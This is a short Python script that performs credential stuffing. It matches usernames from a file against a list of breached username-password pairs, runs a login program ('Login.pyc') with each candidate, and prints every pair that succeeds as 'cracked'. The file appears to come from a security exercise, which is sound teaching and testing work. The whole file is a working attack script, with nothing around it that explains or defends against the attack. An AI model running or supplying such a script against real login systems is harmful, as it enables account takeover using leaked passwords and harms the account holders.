import time
import subprocess


start = time.time()
print("Start Time: 0 seconds")
PwnedPWfile = open("PwnedPWfile", "r")
gang = open("gang", "r")
g = gang.read().splitlines()
p = PwnedPWfile.read().splitlines()
for i in g:
  for j in p:
    if i in j:
      k = j.split(",")
      command = subprocess.run(["python3", "Login.pyc", i, k[1]], capture_output = True, text = True)
      if "success" in command.stdout:
        print("Cracked username and password: " + j)
end = time.time() - start
print("End time: ", end, " seconds")
PwnedPWfile.close()
gang.close()
